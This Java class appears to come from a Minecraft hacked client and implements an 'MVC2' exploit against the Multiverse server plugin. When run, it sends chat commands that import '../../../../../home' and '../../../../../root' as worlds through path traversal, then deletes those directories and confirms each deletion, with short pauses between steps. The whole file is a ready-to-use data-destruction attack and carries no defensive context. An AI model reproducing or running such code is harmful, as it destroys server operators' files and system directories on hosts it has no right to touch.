package wtf.norma.nekito.exploit.impl.other;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;

import java.util.concurrent.CompletableFuture;

@ExploitInfo(
        name = "MVC2",
        type = ExploitType.OTHER,
        description = "Multiverse2 Exploit"
)
/*
author @intexpression
 */


public class MVCEXPLOIT2 extends Exploit {

    int power = 1;
    @Override
    public void execute(Object... args) throws ExploitException {
        CompletableFuture.runAsync(() -> {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv import ../../../../../home normal -t flat"));
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv import ../../../../../root normal -t flat"));
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv delete ../../../../../home"));
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv confirm"));
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv delete ../../../../../root"));
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/mv confirm"));
        });
    }
    }

